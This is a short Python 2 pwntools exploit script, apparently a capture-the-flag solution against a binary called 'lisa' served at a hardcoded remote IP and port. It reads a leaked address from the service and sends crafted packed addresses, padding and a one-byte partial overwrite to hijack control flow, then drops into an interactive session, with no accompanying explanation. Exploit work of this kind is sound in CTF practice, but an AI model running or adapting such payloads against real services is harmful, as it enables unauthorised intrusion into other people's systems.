#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('lisa')

host = args.HOST or '18.191.244.121'
port = int(args.PORT or 12345)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

context.terminal = ['gnome-terminal', '-e']
gdbscript = '''
break *0x56555d15
break *0x565557e0
break *0x565557ff
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil('share: ')
addr = int(io.recvuntil('\n').strip(), 16)
log.info(hex(addr))

#io.send("B" * 48)
#io.sendafter("mouth?", "A" * 24)
io.send(p32(0x0) + p32(addr) + p32(0xdeadbeef))
io.send("B" * 24 + "YYYY" + p8(0x15))
io.send(p32(0x0))

io.interactive()

